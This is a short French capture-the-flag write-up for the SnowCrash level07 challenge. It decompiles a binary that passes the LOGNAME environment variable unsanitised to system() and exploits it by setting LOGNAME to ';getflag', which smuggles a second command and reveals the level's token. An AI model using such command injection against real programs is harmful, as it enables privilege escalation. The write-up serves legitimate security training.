On commence par lister les fichiers

```bash
level07@SnowCrash:~$ ls
level07
```

En décompilant le binaire via le site [dogbolt](https://dogbolt.org)

```c
char *var_1c = NULL;
asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
return system(var_1c);
```

On observe qu'il récupère la valeur de la variable d’environnement **LOGNAME** via `getenv("LOGNAME")`.

Par défaut, le programme affiche simplement la valeur de **LOGNAME**
```bash
level07@SnowCrash:~$ ./level07 
level07
```

On peut confirmer la valeur actuelle de **LOGNAME**
```bash
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=level07
```

Le programme ne fait pas un simple ajout d'argument à la commande `echo`, mais à la place format le prompt comme si c'était une commande.

On peut donc modifier la variable d’environnement **LOGNAME** pour y injecter un appel à `getflag`.

```bash
level07@SnowCrash:~$ export LOGNAME=";getflag"
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
